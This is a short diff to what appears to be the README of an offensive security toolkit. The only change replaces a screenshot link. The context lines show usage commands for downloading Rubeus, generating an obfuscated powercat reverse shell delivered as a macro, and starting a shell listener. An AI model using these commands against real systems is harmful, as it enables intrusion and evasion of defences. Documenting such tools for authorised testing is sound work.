@@ -26,7 +26,7 @@ toolpy -d rubeus
 ```bash
 shellpy <ip> <port> -powercat --obfuscate --macro
 ```
-![shellpy](https://github.com/user-attachments/assets/b8967d23-2f90-4b52-92e9-0068facc9a4b)
+![shell3](https://github.com/user-attachments/assets/9bb1efe9-bcaa-49b8-b99b-b865b758eefe)
 3. Shell listener
 ```bash
 shellListener <port>
